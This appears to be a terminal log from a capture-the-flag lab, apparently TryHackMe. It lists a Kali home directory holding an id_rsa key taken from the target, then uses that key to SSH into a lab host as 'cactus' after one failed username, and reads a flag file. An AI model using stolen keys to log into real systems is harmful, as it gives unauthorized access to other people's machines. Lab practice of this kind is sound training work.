drwxr-xr-x 18 kali kali  4096 Aug 11 15:08  .config
drwx------  3 kali kali  4096 Apr 13 08:51  .dbus
drwxr-xr-x  2 kali kali  4096 Aug 11 15:37  Desktop
-rw-r--r--  1 kali kali    35 Apr  3 11:36  .dmrc
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Documents
drwxr-xr-x  3 kali kali  4096 Sep  3 10:16  Downloads
-rw-------  1 kali kali 12288 Aug 26 00:09  .exp.swp
-rw-r--r--  1 kali kali 11759 Feb 25  2024  .face
lrwxrwxrwx  1 kali kali     5 Feb 25  2024  .face.icon -> .face
drwx------  3 kali kali  4096 Apr  3 11:36  .gnupg
drwx------  2 kali kali  4096 Apr 13 08:51  .gvfs
-rw-------  1 kali kali     0 Apr  3 11:36  .ICEauthority
-rw-------  1 root root  1679 Sep 11 13:15  id_rsa
-rw-r--r--  1 root root   396 Sep 11 13:15  id_rsa.pub
drwxr-xr-x  4 kali kali  4096 Apr 12 00:40  .java
-rw-------  1 kali kali    20 Aug  7 23:06  .lesshst
drwxr-xr-x  4 kali kali  4096 Apr  3 11:36  .local
drwx------  4 kali kali  4096 Apr  4 13:27  .mozilla
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Music
drwxr-xr-x  2 kali kali  4096 Apr 11 22:40  nessus
drwxr-xr-x  2 kali kali  4096 May  6 12:48  Pictures
drwx------  3 kali kali  4096 Apr 12 03:00  .pki
-rw-r--r--  1 kali kali   807 Sep 10 12:38  .profile
-rw-r--r--  1 root root   807 Sep 11 13:08  profile
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Public
-rw-r--r--  1 root root     0 Sep 11 13:09  sudoadmin
-rw-r--r--  1 kali kali     0 Apr  3 12:29  .sudo_as_admin_successful
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Templates
drwxr-xr-x  2 kali kali  4096 Apr  3 11:36  Videos
-rw-------  1 kali kali 12860 Sep  2 12:20  .viminfo
-rw-r--r--  1 root root   358 Sep 11 13:14 'Working From Home Information.txt'
-rw-------  1 kali kali    49 Sep 11 12:41  .Xauthority
-rw-------  1 kali kali  4255 Sep 11 12:47  .xsession-errors
-rw-------  1 kali kali  4182 Sep 11 09:47  .xsession-errors.old
-rw-------  1 kali kali  6281 Sep 10 13:33  .zsh_history
-rw-r--r--  1 kali kali 10868 Feb 25  2024  .zshrc
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ssh -i /home/kali/id_rsa johncactus@10.10.59.204

The authenticity of host '10.10.59.204 (10.10.59.204)' can't be established.
ED25519 key fingerprint is SHA256:IiPAreH3/zvA2edHv44DY7aO0feb2/pHmNR7B1VK7+o.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.59.204' (ED25519) to the list of known hosts.
johncactus@10.10.59.204's password: 
Permission denied, please try again.
johncactus@10.10.59.204's password: 
Permission denied, please try again.
johncactus@10.10.59.204's password: 
johncactus@10.10.59.204: Permission denied (publickey,password).
                                                                                                                   
┌──(root㉿kali)-[/home/kali]
└─# ssh -i /home/kali/id_rsa cactus@10.10.59.204 

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 11 17:34:58 UTC 2024

  System load:  0.0                Processes:           92
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 32%                IP address for eth0: 10.10.59.204
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
cactus@polosmb:~$ ls
smb.txt
cactus@polosmb:~$ cat smb.txt
THM{smb_is_fun_eh?}
